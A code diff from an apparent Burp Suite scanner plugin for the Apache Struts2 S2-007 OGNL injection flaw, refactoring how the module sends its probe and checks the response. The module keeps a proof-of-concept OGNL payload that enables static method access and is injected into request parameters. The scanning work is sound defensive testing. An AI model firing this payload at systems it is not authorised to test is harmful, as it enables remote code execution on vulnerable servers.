@@ -8,8 +8,6 @@ import java.util.Arrays;
 import java.util.List;
 
 public class S2_007 extends IModule {
-    public String randomMark = Util.getRandomString(16);
-    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
     public String poc =
         "'+(" +
         "#_memberAccess.allowStaticMethodAccess=true," +
@@ -39,22 +37,12 @@ public class S2_007 extends IModule {
 
     @Override
     public IScanIssue start() {
-        IHttpService httpService = iHttpRequestResponse.getHttpService();
-        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
-
         List<IParameter> parameters = requestInfo.getParameters();
         for (IParameter parameter: parameters) {
             if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                 IParameter newParameter = helpers.buildParameter(parameter.getName(), URLEncoder.encode(poc), parameter.getType());
-                byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
-                IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
-                byte[] response = newHttpRequestResponse.getResponse();
-                IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
-                byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);
-
-                String bodyText = new String(body);
-                if (bodyText.contains(randomMark)) {
-                    this.iHttpRequestResponse = newHttpRequestResponse;
+                request = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
+                if (check()) {
                     this.detail = URLEncoder.encode(exp);
                     return creatCustomScanIssue();
                 }
